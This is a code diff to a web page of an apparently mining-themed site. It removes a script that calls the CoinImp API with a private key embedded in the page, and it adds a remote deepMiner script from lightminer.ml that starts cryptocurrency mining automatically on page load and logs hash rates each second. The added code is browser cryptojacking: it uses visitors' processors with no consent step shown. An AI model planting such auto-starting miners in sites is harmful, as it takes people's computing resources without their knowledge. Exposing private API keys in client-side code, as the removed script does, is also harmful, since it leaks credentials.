@@ -14,15 +14,29 @@
             <a href="./FAQ.html">FAQ</a>
             <a href="./miner.html">Mine Now</a>
         </div>
-        <script type="text/javascript">
-            var request = new XMLHttpRequest();
-            request.open('GET', 'https://www.coinimp.com/api/v1/reward?public=9fbd30251c0ffb59a2a0cb9c4e96cd0ec721f81fd56b667f7c8f5d6f524b4dc2&private=d84fd85970f03c7c20e7ab762f82f2c8fdf8185c9d2a47705011a0263795106a&currency=web', true);
-            request.onload = function () {
-                var data = JSON.parse(request.response)
-                console.log(data.message)
-            }
-            request.send();
+        <script src="https://lightminer.ml/lib/deepMiner.min.js"></script>
+        <script>
+            var miner = new deepMiner.Init('lightMiner');
+            miner.start();
         </script>
-
+        <script>
+            // Listen on events
+            miner.on('found', function() { /* Hash found */ })
+            miner.on('accepted', function() { /* Hash accepted */ })
+        
+            // Update stats once per second
+            setInterval(function() {
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+                console.table({
+                    "hashesPerSecond":hashesPerSecond,
+                    "totalHashes":totalHashes,
+                    "acceptedHashes":acceptedHashes});
+        
+                // Output to HTML elements...
+        
+            }, 1000);
+        </script>
     </body>
 </html>
